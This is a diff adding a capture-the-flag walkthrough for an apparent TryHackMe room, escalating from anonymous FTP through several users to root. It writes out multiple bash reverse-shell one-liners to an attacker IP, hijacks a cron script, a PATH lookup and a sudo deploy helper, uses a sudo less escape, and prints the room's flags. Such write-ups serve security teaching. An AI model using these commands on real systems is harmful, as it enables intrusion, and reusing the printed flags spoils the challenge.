@@ -1,0 +1,188 @@
+# TryHackMe "Jump" - Complete Privilege Escalation Walkthrough
+
+## Objective
+Escalate from anonymous FTP access through 5 users:
+recon_user -> dev_user -> monitor_user -> ops_user -> root
+
+---
+
+## 1. Initial Reconnaissance
+
+```
+nmap -sV -vvv -A 10.48.136.91
+```
+
+Open ports:
+- 21/tcp - vsftpd 3.0.5 (Anonymous FTP login allowed)
+- 22/tcp - OpenSSH 9.6p1 Ubuntu
+
+---
+
+## 2. recon_user - Anonymous FTP to Shell
+
+Connect to FTP:
+```
+ftp 10.48.136.91
+Name: anonymous
+Password: (any)
+```
+
+Explore:
+```
+cd pub
+get README.txt
+```
+
+README reveals a recon pipeline auto-processes files placed in `incoming/`.
+
+Upload a reverse shell:
+```bash
+echo '#!/bin/bash
+bash -i >& /dev/tcp/192.168.164.33/4444 0>&1' > reverse.sh
+```
+
+From FTP:
+```
+cd incoming
+put reverse.sh
+```
+
+Start listener on attacker machine:
+```bash
+nc -nvlp 4444
+```
+
+Connection received as recon_user.
+
+### recon_user flag
+```
+cat /home/recon_user/flag.txt
+THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11}
+```
+
+---
+
+## 3. dev_user - Group Privilege
+
+Check groups:
+```
+id
+```
+recon_user is in groups: recon_user, dev_user, devops
+
+dev_user's home is accessible:
+```
+cat /home/dev_user/flag.txt
+THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123}
+```
+
+The backup script at `/opt/dev/backup.sh` is group-writable and runs as dev_user via cron.
+
+Overwrite with reverse shell:
+```bash
+echo '#!/bin/bash
+bash -i >& /dev/tcp/192.168.164.33/4446 0>&1' > /opt/dev/backup.sh
+```
+
+Start listener on 4446 and wait for cron to trigger it:
+```bash
+nc -nvlp 4446
+```
+
+---
+
+## 4. monitor_user - PATH Hijack via Healthcheck
+
+From dev_user shell, examine the healthcheck service:
+```
+cat /etc/systemd/system/healthcheck.service
+```
+
+Service runs as monitor_user with:
+- `PATH=/opt/dev/bin:/usr/local/bin:/usr/bin`
+- ExecStart: `/usr/local/bin/healthcheck`
+
+The healthcheck script calls `ps aux` without a full path.
+
+Overwrite `/opt/dev/bin/ps` with a reverse shell and make it executable:
+```bash
+echo '#!/bin/bash
+bash -i >& /dev/tcp/192.168.164.33/4447 0>&1' > /opt/dev/bin/ps
+chmod +x /opt/dev/bin/ps
+```
+
+Start listener on 4447. The healthcheck runs `ps` every 5 seconds and picks up our malicious `ps` from PATH.
+
+### monitor_user flag
+```
+cat /home/monitor_user/flag.txt
+```
+
+---
+
+## 5. ops_user - Sudo Deploy Script
+
+From monitor_user shell:
+```
+sudo -l
+```
+
+Result: `(ops_user) NOPASSWD: /usr/local/bin/deploy.sh`
+
+Inspect the deploy script:
+```
+cat /usr/local/bin/deploy.sh
+```
+It runs `./deploy_helper.sh` from `/opt/app/`.
+
+Overwrite deploy_helper.sh:
+```bash
+echo '#!/bin/bash
+bash -i >& /dev/tcp/192.168.164.33/4448 0>&1' > /opt/app/deploy_helper.sh
+```
+
+Start listener on 4448, then execute:
+```bash
+sudo -u ops_user /usr/local/bin/deploy.sh
+```
+
+### ops_user flag
+```
+cat /home/ops_user/flag.txt
+THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88}
+```
+
+---
+
+## 6. root - Sudo Less to Root Shell
+
+From ops_user shell:
+```
+sudo -l
+```
+
+Result: `(root) NOPASSWD: /usr/bin/less`
+
+Exploit via less's shell escape:
+```bash
+sudo less /etc/hosts
+```
+
+Inside less, type `!/bin/bash` and press Enter to get a root shell.
+
+### root flag
+```
+cat /root/flag.txt
+THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22}
+```
+
+---
+
+## Final Flags Summary
+| User | Flag |
+|------|------|
+| recon_user | THM{5a3f1c92-7b4e-4d91-8c2a-1f6e9b2a4c11} |
+| dev_user | THM{8d2b7a41-3f9c-4e55-b1a2-6c7d9e8f0123} |
+| monitor_user | THM{...} |
+| ops_user | THM{f7a2c9d1-6e33-4b55-8d11-9c0a7b2e4d88} |
+| root | THM{2b8e6c4a-1d55-4f90-a3c7-5e9d1b7f6a22} |
